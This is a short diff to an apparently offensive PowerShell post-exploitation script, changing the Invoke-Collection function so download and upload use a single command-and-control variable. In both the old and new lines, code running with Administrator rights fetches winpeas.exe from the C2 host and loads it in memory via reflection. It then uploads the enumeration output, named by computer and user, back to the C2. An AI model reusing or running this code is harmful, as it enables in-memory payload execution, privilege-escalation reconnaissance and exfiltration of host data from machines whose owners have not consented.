@@ -167,7 +167,7 @@ function Invoke-Collection {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($identity)
     if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $peasUrl = "http://$DownloadC2/winpeas.exe"
+        $peasUrl = "http://$C2/winpeas.exe"
         $wp = [System.Reflection.Assembly]::Load(
             [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
         )
@@ -185,7 +185,7 @@ function Invoke-Collection {
         # Restore console output
         [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
-        Invoke-FileUpload -C2 $UploadC2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeasPostexp.txt" | Out-Null
+        Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeasPostexp.txt" | Out-Null
     }
 }
 
